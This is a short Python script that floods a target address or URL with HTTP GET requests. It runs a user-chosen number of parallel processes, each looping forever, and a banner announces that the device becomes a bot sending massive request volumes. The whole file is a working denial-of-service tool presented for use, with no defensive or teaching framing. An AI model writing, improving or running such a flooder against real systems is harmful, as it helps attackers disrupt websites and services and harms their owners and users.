import requests
from multiprocessing import Process

def send_request(target_url):
  while True:
    try:
      response = requests.get(f"http://{target_url}")
      if response.status_code == 200:
        print("Requests successfully sent!")
      else:
        print("Mission unsuccessful.")
    except Exception as e:
      pass

if __name__ == "__main__":
  print("""
                                        WARNING:
  THIS SCRIPT TURNS YOUR DEVICE INTO A BOT THAT CONSTANTLY SENDS MASSIVE AMOUNTS OF REQUESTS TO THE TARGET IP/URL!
  1. When entering a URL, please remove the https:// or http:// from the beginning.
  2. To stop sending requests, press Ctrl+C.
  """)

  target_url = input("Enter the target address or URL: ")

  num_processes = int(input("Enter the number of processes to send(THE HIGHER THE NUMBER OF PROCESSES ARE THE GREATER WOULD BE THE REQUESTS): "))

  processes = []

  for _ in range(num_processes):
    p = Process(target=send_request, args=(target_url,))
    p.start()
    processes.append(p)

  for p in processes:
    p.join()
